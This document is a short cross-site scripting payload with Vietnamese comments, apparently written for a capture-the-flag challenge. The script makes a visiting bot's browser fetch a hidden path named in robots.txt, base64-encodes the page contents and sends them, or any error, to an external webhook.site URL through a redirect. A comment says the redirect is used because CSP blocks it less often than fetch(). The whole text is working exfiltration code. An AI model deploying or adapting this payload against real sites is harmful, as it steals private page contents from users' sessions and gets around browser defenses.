<script>
  // 1. Truy cập vào đường dẫn bí mật tìm thấy trong robots.txt
  fetch('/secret-security-dashboard')
    .then(response => {
      return response.text();
    })
    .then(data => {
      // 2. Mã hóa nội dung lấy được để không bị lỗi URL
      // Dùng encodeURIComponent trước để xử lý ký tự đặc biệt/tiếng Việt
      var encodedData = btoa(encodeURIComponent(data));
      
      // 3. Ép trình duyệt Bot chuyển hướng sang Webhook của bạn kèm theo dữ liệu
      // Cách này mạnh hơn fetch() vì ít bị chặn bởi CSP
      window.location = 'https://webhook.site/ff155356-a064-493a-b9c6-3a7f0d90a3a1?flag_data=' + encodedData;
    })
    .catch(err => {
      // Nếu lỗi, báo về để biết
      window.location = 'https://webhook.site/ff155356-a064-493a-b9c6-3a7f0d90a3a1?error=' + encodeURIComponent(err);
    });
</script>